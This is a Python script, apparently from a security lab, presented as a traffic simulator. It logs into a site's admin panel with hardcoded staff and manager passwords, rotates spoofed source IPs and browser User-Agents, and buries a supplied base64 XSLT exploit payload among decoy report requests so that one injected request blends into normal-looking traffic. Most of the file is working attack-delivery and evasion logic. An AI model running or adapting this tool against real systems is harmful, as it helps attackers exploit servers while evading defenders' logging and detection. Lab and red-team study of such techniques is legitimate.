#!/usr/bin/env python3
"""
Traffic simulator - mô phỏng hành vi người dùng từ nhiều IP
Dùng trong lab VMware, các IP alias đã được add trên attacker VM
"""
import requests
import random
import time
import base64
import socket
import struct
from requests.adapters import HTTPAdapter

TARGET = "http://hunter.local.com"
CREDS  = [
    {"username": "staff",   "password": "Staff@2026"},
    {"username": "manager", "password": "Manager@2026"},
]

# IP alias đã add trên VM - chỉnh lại cho đúng
SOURCE_IPS = [
    "10.16.16.50",
    "10.16.16.51",
    "10.16.16.52",
    "10.16.16.53",
    "10.16.16.54",
]

# 30 clean template base64 (đọc từ file)
import os
NOISE_FILE = os.path.join(os.path.dirname(__file__), "noise_templates.txt")

def load_noise_templates():
    templates = []
    if not os.path.exists(NOISE_FILE):
        return []
    with open(NOISE_FILE, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                templates.append(line)
    return templates

NOISE_TEMPLATES = load_noise_templates()


class SourceIPAdapter(HTTPAdapter):
    """HTTPAdapter bind ra source IP cụ thể."""
    def __init__(self, source_ip, **kwargs):
        self.source_ip = source_ip
        super().__init__(**kwargs)

    def send(self, request, **kwargs):
        kwargs["timeout"] = kwargs.get("timeout", 10)
        old_connect = socket.create_connection
        source_ip = self.source_ip

        def patched_connect(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,
                            source_address=None):
            return old_connect(address, timeout=timeout,
                               source_address=(source_ip, 0))

        socket.create_connection = patched_connect
        try:
            return super().send(request, **kwargs)
        finally:
            socket.create_connection = old_connect


def make_session(source_ip):
    s = requests.Session()
    s.mount("http://",  SourceIPAdapter(source_ip))
    s.mount("https://", SourceIPAdapter(source_ip))
    s.headers.update({
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ])
    })
    return s


def login(session, cred):
    """Đăng nhập, trả về True nếu thành công."""
    try:
        r = session.get(f"{TARGET}/admin/login.aspx", timeout=8)
        r = session.post(f"{TARGET}/admin/login.aspx", data={
            "username": cred["username"],
            "password": cred["password"],
        }, allow_redirects=True, timeout=8)
        return "logout" in r.text.lower() or r.url.endswith("default.aspx") or "/admin/" in r.url
    except Exception as e:
        print(f"  [login error] {e}")
        return False


def browse_noise(session):
    """Duyệt các trang admin bình thường."""
    pages = [
        "/admin/",
        "/admin/default.aspx",
        "/admin/orders.aspx",
        "/admin/products.aspx",
        "/",
        "/product.aspx?id=1",
        "/product.aspx?id=2",
    ]
    page = random.choice(pages)
    try:
        session.get(f"{TARGET}{page}", timeout=8)
        print(f"  browse: {page}")
    except:
        pass
    time.sleep(random.uniform(1.5, 4.0))


def send_report(session, tpl_b64, label="noise"):
    """Gửi 1 report request với template base64."""
    try:
        r = session.get(
            f"{TARGET}/admin/reports.aspx",
            params={"action": "preview", "tpl": tpl_b64},
            timeout=10
        )
        print(f"  report [{label}] status={r.status_code} len={len(r.text)}")
        return r
    except Exception as e:
        print(f"  report error: {e}")
        return None


def simulate_user(source_ip, cred, noise_count, payload_b64=None, inject_at=None):
    """
    Mô phỏng 1 người dùng từ source_ip.
    - noise_count: số request clean trước/sau
    - payload_b64: nếu có thì chèn vào giữa
    - inject_at: vị trí chèn payload (index trong noise list)
    """
    print(f"\n[+] IP={source_ip} user={cred['username']}")
    session = make_session(source_ip)

    if not login(session, cred):
        print("  [-] Login failed, skip")
        return

    print("  [+] Logged in")
    time.sleep(random.uniform(2, 5))

    # Shuffle noise templates
    templates = random.sample(NOISE_TEMPLATES, min(noise_count, len(NOISE_TEMPLATES)))

    if payload_b64 and inject_at is not None:
        inject_idx = min(inject_at, len(templates))
        templates.insert(inject_idx, None)  # None = placeholder cho payload

    for i, tpl in enumerate(templates):
        browse_noise(session)

        if tpl is None:
            # Đây là payload
            print(f"  [*] Injecting payload at position {i}")
            send_report(session, payload_b64, label="PAYLOAD")
        else:
            send_report(session, tpl, label=f"clean-{i+1}")

        time.sleep(random.uniform(3, 12))

    print(f"  [+] Done: {source_ip}")


def run(payload_b64=None, noise_per_ip=5, parallel=False):
    """
    Chạy simulation.
    payload_b64: base64 của XSLT exploit, None = chỉ gửi noise
    noise_per_ip: số request clean mỗi IP
    """
    if not NOISE_TEMPLATES:
        print("[!] noise_templates.txt không tìm thấy hoặc rỗng")
        return

    print(f"[*] Loaded {len(NOISE_TEMPLATES)} noise templates")
    print(f"[*] Source IPs: {SOURCE_IPS}")
    print(f"[*] Payload: {'YES' if payload_b64 else 'NO - noise only'}")

    # Chọn 1 IP random để inject payload, còn lại gửi noise thuần
    inject_ip_idx = random.randint(0, len(SOURCE_IPS) - 1) if payload_b64 else -1

    for idx, ip in enumerate(SOURCE_IPS):
        cred = random.choice(CREDS)
        if idx == inject_ip_idx and payload_b64:
            inject_at = random.randint(2, noise_per_ip - 1)
            simulate_user(ip, cred, noise_per_ip, payload_b64, inject_at)
        else:
            simulate_user(ip, cred, noise_per_ip)
        time.sleep(random.uniform(5, 15))

    print("\n[*] Simulation complete")


if __name__ == "__main__":
    import sys

    # Chạy chỉ noise: python traffic_sim.py
    # Chạy với payload: python traffic_sim.py <base64_exploit>
    payload = sys.argv[1] if len(sys.argv) > 1 else None
    run(payload_b64=payload, noise_per_ip=6)